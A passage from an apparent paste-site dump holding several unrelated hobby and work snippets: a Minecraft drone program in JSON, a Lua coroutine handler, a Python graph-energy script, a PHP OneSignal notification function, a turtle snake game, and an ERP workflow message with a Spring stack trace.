          ""value"": 40.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 99.0
        },
        ""UP"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""SOUTH"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""useCount"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""EAST"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""area""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -254.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 99.0
        },
        ""pos1"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""pos2"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""boxType"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""type"": {
          ""type"": 8,
          ""value"": ""box""
        },
        ""var2"": {
          ""type"": 8,
          ""value"": ""Output Chest""
        },
        ""var1"": {
          ""type"": 8,
          ""value"": ""Output Chest""
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""item_filter""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -254.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 110.0
        },
        ""id"": {
          ""type"": 8,
          ""value"": ""minecraft:cobblestone""
        },
        ""Count"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""drone_condition_item""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -149.0
        },
        ""requiredCount"": {
          ""type"": 3,
          ""value"": 16.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 41.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Pick up Cobble""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -164.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 52.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""item_filter""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -134.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 41.0
        },
        ""id"": {
          ""type"": 8,
          ""value"": ""minecraft:cobblestone""
        },
        ""Count"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Light Check""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 213.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 56.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""jump""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 198.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 56.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Air Check""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 68.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -2.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""wait""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 198.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -43.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""1s""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 213.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -43.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 198.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Bridge3""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -21.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": -12.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": -12.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 213.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""$owner""
        },
        ""y"": {
          ""type"": 3,
          ""value"": -10.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 213.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Bridge1""
        },
        ""y"": {
          ""type"": 3,
          ""value"": -21.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 228.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Bridge2""
        },
        ""y"": {
          ""type"": 3,
          ""value"": -21.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 198.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Bridge4""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -10.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 198.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Bridge5""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 1.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 20.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 20.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 213.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Bridge3""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 1.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 228.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Bridge4""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 1.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 198.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Bridge6""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 12.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 20.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 20.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 213.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""$owner""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 12.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 20.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 20.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 228.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Bridge5""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 12.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 198.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Bridge7""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 23.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 20.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 20.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 213.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""$owner""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 23.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": -2.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 228.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 23.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": -2.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 243.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 12.0
        }
      }
    ]
  }
}"
SAMQsW5R,Simple coroutine handler implementation,fatboychummy,Lua,Friday 24th of November 2023 12:47:14 AM CDT,"-- Simple coroutine handler implementation, by Fatboychummy.

local function coro_handler(win, func, ...)
  local coro = coroutine.create(func) -- the coroutine we will be responsible for

  -- redirect to the window to ensure we are on the correct window.
  local old_win = term.redirect(win)

  -- initialize the coroutine.
  local ok, event_filter = coroutine.resume(coro, ...)
  -- `event_filter` is the event the coroutine is currently listening for. If `nil`, any event is fine.
  -- `ok` is whether or not the coroutine errored when ran.

  -- and redirect back to the original window once we're done, so other
  -- programs don't start suddenly drawing to our program's window.
  term.redirect(old_win)

  while true do
    -- Check the status of the coroutine. If it is dead, we exit.
    if coroutine.status(coro) == ""dead"" then
      return
    end

    -- Here we grab the next event from the parent.
    local event_data = table.pack(coroutine.yield(event_filter))

    -- HERE IS WHERE YOU WOULD ALTER THE EVENT DATA.
    -- For example, to decrement all y positions of mouse events by 1, do the following:
    local ev = event_data[1]
    if ev == ""mouse_click"" or ev == ""mouse_drag"" or ev == ""mouse_up"" then
      event_data[3] = event_data[3] - 1
    end

    -- Now, we run the coroutine once. However, we only want to resume the event if:
    -- 1. The coroutine is listening for the event.
    -- 2. The coroutine is listening for any event.
    -- 3. The event is ""terminate"", which is always propagated.
    -- or 4. The mouse event is NOT at position 1 (position 0 now, since we decremented it).
    --    This is because the mouse event is now at the top bar, which we don't want to propagate.
    if event_filter == nil or event_filter == event_data[1] or event_data[1] == ""terminate"" or event_data[3] ~= 0 then
      -- redirect to the window to ensure we are on the correct window.
      old_win = term.redirect(win)

      ok, event_filter = coroutine.resume(coro, table.unpack(event_data, 1, event_data.n))

      -- and redirect back to the original window once we're done, so other
      -- programs don't start suddenly drawing to our program's window.
      term.redirect(old_win)
    end

    -- If the coroutine errored, we propagate the error.
    if not ok then
      -- The error message is stored in `event_filter` when the coroutine errors.
      error(event_filter, 0)
    end
  end
end

-- Get the size of the terminal.
local w, h = term.getSize()

-- Create a window that is 1 height less than the terminal size (for the program).
-- We also position it at y=2, since the top bar is at y=1.
local program_window = window.create(term.current(), 1, 2, w, h - 1)

-- Create a window that is 1 height and the width of the terminal (for the top bar).
local top_bar_window = window.create(term.current(), 1, 1, w, 1)

-- Our sample ""program"" that will be run in a coroutine.
local function program()
  while true do
    print(""We got an event!"")
    print(""Event data:"", os.pullEvent())
  end
end

-- Our sample top bar that just flashes random colours once per second.
local function top_bar()
  while true do
    top_bar_window.setBackgroundColor(2^(math.random(0, 15)))
    top_bar_window.clear()
    sleep(1)
  end
end

-- And now we tie it together with the parallel library.

parallel.waitForAny(
  function()
    -- Run the program in a coroutine.
    -- We need this wrap-around function because `coro_handler` requires arguments.
    coro_handler(program_window, program)
  end,
  top_bar -- Run the top bar.
)

-- We use `parallel.waitForAny` above because we want the top bar to stop when the program stops."
Gk4QgNeY,бмо графы,vatman,Python,Friday 24th of November 2023 12:46:11 AM CDT,"import numpy as np
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D
import networkx as nx
from scipy.spatial import distance
 
vectors = [np.random.randint(-6, 7, 64) for _ in range(10)]
 
# Выводим все векторы
for i, vector in enumerate(vectors):
    print(f'Вектор {i+1}:')
    print(vector)
    print()
 
# Выбираем три случайные точки (вектора)
indices = np.random.choice(len(vectors), 3, replace=False)
selected_vectors = [vectors[i] for i in indices]
 
# Создаем граф
G = nx.Graph()
for i in range(3):
    G.add_node(i)
 
# Добавляем ребра так, чтобы получилось дерево (без циклов)
G.add_edge(0, 1)
G.add_edge(0, 2)
 
# Расчет энергии вершины
def calculate_vertex_energy(vertex, vectors, k):
    energy = 0
    for vector in vectors:
        energy += np.linalg.norm(vertex - vector)**2
    return k * energy
 
# Расчет энергии ребра
def calculate_edge_energy(edge, vectors, k):
    v1, v2 = vectors[edge[0]], vectors[edge[1]]
    return k * np.linalg.norm(v1 - v2)**2
 
# Расчет энергии клина
def calculate_wedge_energy(wedge, vectors, k):
    v1, v2, v3 = vectors[wedge[0]], vectors[wedge[1]], vectors[wedge[2]]
    return k * np.linalg.norm(v1 + v3 - 2*v2)**2
 
# Расчет энергии графа
def calculate_energy(graph, vectors):
    vertex_k = 0.5 # Замените на ваше значение для коэффициента аппроксимации вершин
    edge_k = 0.5 # Замените на ваше значение для коэффициента растяжения ребер
    wedge_k = 0.5 # Замените на ваше значение для коэффициента изгиба клиньев
    
    energy = 0
    for node in graph.nodes:
        energy += calculate_vertex_energy(vectors[node], vectors, vertex_k)
    for edge in graph.edges:
        energy += calculate_edge_energy(edge, vectors, edge_k)
        
    # Добавляем энергию клина (только если в графе есть три вершины)
    if len(graph.nodes) == 3:
        nodes = list(graph.nodes)  # Преобразуем NodeView в список
        energy += calculate_wedge_energy(nodes, vectors, wedge_k)
        
    return energy
 
energy = calculate_energy(G, selected_vectors)
print(f'Энергия графа: {energy}')
 
# Визуализация проекции графа и векторов
fig = plt.figure()
ax = fig.add_subplot(111, projection='3d')
 
# Отображаем все векторы на графике
for vector in vectors:
    ax.scatter(vector[0], vector[1], vector[2], color='b')
 
# Отображаем выбранные векторы на графике
for vector in selected_vectors:
    ax.scatter(vector[0], vector[1], vector[2], color='r')
 
# Добавляем ребра между вершинами
for edge in G.edges:
    ax.plot([selected_vectors[edge[0]][0], selected_vectors[edge[1]][0]],
            [selected_vectors[edge[0]][1], selected_vectors[edge[1]][1]],
            [selected_vectors[edge[0]][2], selected_vectors[edge[1]][2]], 'r-')
 
plt.show()
 "
3LgRHEm6,SendNotification - OneSignal,Sufyan,PHP,Thursday 23rd of November 2023 11:53:28 PM CDT,"    public function sendNotification($title = null, $description = null, $player_ids = [], $extra = []) {
      try {
        $http = new Client();
        $reqData = [
          'app_id' => env('ONESIGNAL_APP_ID'),
          // 'include_player_ids' => $player_ids,
          'include_external_user_ids' => $player_ids, //using 'Users.id'
          'contents' => [
            'en' => $description
          ],
          'headings' => [
            'en' => $title
          ]
        ];
  
        $reqData = array_merge($reqData, $extra);
        $resp = $http->post('https://onesignal.com/api/v1/notifications', json_encode($reqData),
          [
            'headers' => [
              'Content-Type' => 'application/json; charset=utf-8',
              'Authorization' => 'Basic '.env('ONESIGNAL_API_KEY')
            ]
          ]
        );
        return $resp;
      } catch (\Throwable $th) {
        throw $th;
      }
    }"
LxywyGvK,snake 2 from turtle,AlphaPenguino,Python,Thursday 23rd of November 2023 10:49:57 PM CDT,"import turtle
import time
import random

delay = 0.1
game_started = False

score = 0
hi_score = 100

wn = turtle.Screen()
wn.title(""THIS IS THE TITLE"")
wn.bgcolor(""blue"")
wn.setup(width=600, height=600)
wn.tracer(0)

#snake_head
head = turtle.Turtle()
head.speed(0)
head.shape(""triangle"")
head.color(""black"")
head.penup()
head.goto(0,0)
head.direction = ""stop""

segments = []

#food
food= turtle.Turtle()
food.speed(0)
food.shape(""circle"")
food.color(""green"")
food.penup()
food.goto(0,0)

#text
penText = turtle.Turtle()
penText.speed(0)
penText.shape(""square"")
penText.color(""white"")
penText.clear()
penText.penup()
penText.hideturtle()
penText.goto(0, 260)
penText.write(""Press spacebar to start!"", align=""center"", font=('Times New Roman', 25, ""bold""))

def move_up():
    if head.direction != ""down"":
        head.direction = ""up""

def move_down():
    if head.direction != ""up"":
        head.direction = ""down""

def move_left():
    if head.direction != ""right"":
        head.direction = ""left""

def move_right():
    if head.direction != ""left"":
        head.direction = ""right""

def move():
    if head.direction == ""up"":
        head.sety(head.ycor() + 20)
        head.setheading(90)
    if head.direction == ""down"":
        head.sety(head.ycor() - 20)
        head.setheading(270)
    if head.direction == ""left"":
        head.setx(head.xcor() - 20)
        head.setheading(180)
    if head.direction == ""right"":
        head.setx(head.xcor() + 20)
        head.setheading(0)

    for segment in segments:
        if segment.distance(head) < 20:
            time.sleep(1)
            head.goto(0, 0)
            head.direction = ""stop""

            for segment in segments:
                segment.goto(1000, 1000)




def placeFood():
    food.hideturtle()
    food.setx(random.randint(-270, 270))
    food.sety(random.randint(-270, 270))
    food.showturtle()

def gameOver(score, hi_score):
    penText.clear()
    penText.write(""Score: {} Hi-score: {}"".format(score-5, hi_score), align=""center"",
                          font=(""Consolas"", 25, ""bold""))
    turtle.clear()
    turtle.penup()
    turtle.color(""white"")
    turtle.write(""GAME OVER!"", align=""center"", font=(""Comic Sans MS"", 25, ""bold""))

    turtle.hideturtle()
    head.goto(1000,1000)
    head.color(""blue"")
    head.direction = ""stop""
    food.goto(500,500)





def startGame():
    global game_started, delay, score, hi_score
    if game_started:
        return
    game_started = True
    penText.clear()


    while True:
        wn.update()
        if head.distance(food) < 20:
            placeFood()
            newSegment = turtle.Turtle()
            newSegment.speed(0)
            newSegment.shape(""circle"")
            newSegment.color(""white"")
            newSegment.penup()
            segments.append(newSegment)

            if score > hi_score:
                hi_score = score

            penText.clear()
            penText.write(""score: {}  Hi-score: {}"".format(score, hi_score), align=""center"",
                          font=(""Consolas"", 25, ""bold""))
            delay -= 0.001
            score += 5

        for i in range(len(segments)-1, 0, -1):
            segments[i].setx(segments[i-1].xcor())
            segments[i].sety(segments[i-1].ycor())

        if len(segments) > 0:
            segments[0].goto(head.xcor(), head.ycor())


        #collision
        if int(head.xcor()) > 290 or int(head.xcor()) < -290 or int(head.ycor()) > 290 or int(head.ycor()) < -290:

            time.sleep(0)
            game_started = False
            gameOver(score, hi_score)

        move()



        time.sleep(delay)



wn.listen()
wn.onkeypress(move_up, ""w"")
wn.onkeypress(move_down, ""s"")
wn.onkeypress(move_left, ""a"")
wn.onkeypress(move_right, ""d"")
wn.onkeypress(startGame, ""space"")


wn.mainloop()"
keHpeqXc,msg_details_rg_queue,abirama62,JSON,Thursday 23rd of November 2023 10:38:08 PM CDT,"{
  ""action"": ""executeTrigger"",
  ""nextTrigger"": ""ApprovedReceiveGoodsPostEventFired"",
  ""schema"": ""memeflorist"",
  ""tenantId"": 10,
  ""data"": {
    ""date"": ""20231122"",
    ""scheme"": ""CB01"",
    ""data"": ""{\""createUserId\"":31,\""updateUserId\"":31,\""workflowStatus\"":\""DRAFT\"",\""docDate\"":\""20231122\"",\""remark\"":\"" pf sby-Living4u\"",\""docNo\"":\""RG-MF/2311/001337\"",\""version\"":0,\""createDateTime\"":\""20231123093551\"",\""ouId\"":11,\""warehouseId\"":11,\""docTypeId\"":111,\""tenantId\"":10,\""id\"":48540,\""refId\"":48013,\""partnerId\"":46888,\""refDocTypeId\"":101,\""statusDoc\"":\""D\"",\""updateDateTime\"":\""20231123093551\"",\""extDocNo\"":\""-\"",\""extDocDate\"":\""20231122\""}"",
    ""roleId"": 34,
    ""docId"": 48540,
    ""remark"": ""MEG-PO-2311/000393\r\n"",
    ""label"": ""rcvgoodsRG-MF/2311/001337"",
    ""docNo"": ""RG-MF/2311/001337"",
    ""userId"": 31,
    ""param"": {
      ""autonumDocDate"": ""20231122"",
      ""autonumDocData"": ""{\""createUserId\"":-1,\""code\"":\""Mega\"",\""updateUserId\"":-1,\""active\"":\""Y\"",\""version\"":0,\""parentId\"":-99,\""createDateTime\"":\""20210727102622\"",\""activeDateTime\"":\""20210727102622\"",\""nonActiveDateTime\"":\"" \"",\""tenantId\"":10,\""name\"":\""CV Mega Multi Kreasi\"",\""typeId\"":10,\""id\"":11,\""updateDateTime\"":\""20210727102622\""}"",
      ""receiveGoodsId"": 48540,
      ""userId"": 31,
      ""datetime"": ""20231123093557"",
      ""tenantId"": 10
    },
    ""tenantId"": 10,
    ""action"": ""SUBMIT"",
    ""flgUserRole"": ""U"",
    ""nextState"": ""APPROVED"",
    ""id"": ""899b760b-f18b-4297-8b78-d4e2d0080d22"",
    ""timestamp"": 1700706957534
  },
  ""_error"": ""org.springframework.transaction.UnexpectedRollbackException: Transaction silently rolled back because it has been marked as rollback-only\n\tat org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:755)\n\tat org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:714)\n\tat org.springframework.transaction.interceptor.TransactionAspectSupport.completeTransactionAfterThrowing(TransactionAspectSupport.java:568)\n\tat org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:299)\n\tat org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:98)\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)\n\tat org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:688)\n\tat org.jleaf.erp.purch.services.receivegoods.triggers.ApprovedReceiveGoodsPostEventFiredExecute$$EnhancerBySpringCGLIB$$c90f1b15.execute(<generated>)\n\tat org.jleaf.erp.purch.services.receivegoods.triggers.ApprovedReceiveGoodsPostEventFired.execute(ApprovedReceiveGoodsPostEventFired.java:44)\n\tat org.jleaf.workflow.core.processor.ApprovedProcessor.process(ApprovedProcessor.java:97)\n\tat org.jleaf.workflow.core.engine.WorkflowExecutor.completeRequest(WorkflowExecutor.java:575)\n\tat org.jleaf.workflow.core.engine.WorkflowExecutor.complete(WorkflowExecutor.java:94)\n\tat org.jleaf.serviceflow.task.SubmitApprovalTask.executeComplete(SubmitApprovalTask.java:166)\n\tat org.jleaf.serviceflow.task.CallBtTask.execute(CallBtTask.java:85)\n\tat org.jleaf.serviceflow.impl.DefaultServiceFlowExecutor.execute(DefaultServiceFlowExecutor.java:96)\n\tat org.jleaf.service.boot.core.proxy.TaskProxyProcessor.execute(TaskProxyProcessor.java:79)\n\tat org.jleaf.service.boot.core.AbstractJsonProxyProcessor.process(AbstractJsonProxyProcessor.java:43)\n\tat org.jleaf.service.boot.core.controller.v1.ServiceController.task(ServiceController.java:51)\n\tat sun.reflect.GeneratedMethodAccessor85.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.lang.reflect.Method.invoke(Method.java:498)\n\tat org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190)\n\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138)\n\tat org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104)\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:892)\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:797)\n\tat org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87)\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1039)\n\tat org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942)\n\tat org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1005)\n\tat org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:908)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:660)\n\tat org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:741)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.jleaf.service.boot.core.httpfilter.JwtLoginFilter.doFilter(JwtLoginFilter.java:49)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.jleaf.service.boot.core.httpfilter.JwtTaskFilter.doFilter(JwtTaskFilter.java:53)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.jleaf.service.boot.core.httpfilter.MultiTenantFilter.doFilter(MultiTenantFilter.java:38)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.jleaf.service.boot.core.httpfilter.ProtectPathFromPublicFilter.doFilter(ProtectPathFromPublicFilter.java:35)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.jleaf.service.boot.core.httpfilter.AllowCORSFilter.doFilter(AllowCORSFilter.java:48)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat 